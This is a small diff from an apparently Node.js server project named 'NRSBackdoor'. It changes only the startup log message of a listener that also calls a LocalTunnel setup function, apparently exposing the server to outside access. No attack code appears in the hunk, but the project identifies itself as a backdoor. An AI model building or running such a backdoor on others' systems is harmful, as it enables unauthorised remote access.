@@ -39,6 +39,6 @@ Web.use("", function(req, res){
 
 //Listener
 Web.listen(Port, function(){
-    console.log(`The NRSBackdoor is running in port ${Port}.`)
+    console.log(`NRSBackdoor is running in port ${Port}`)
     LocalTunnel_Establisher()
 })
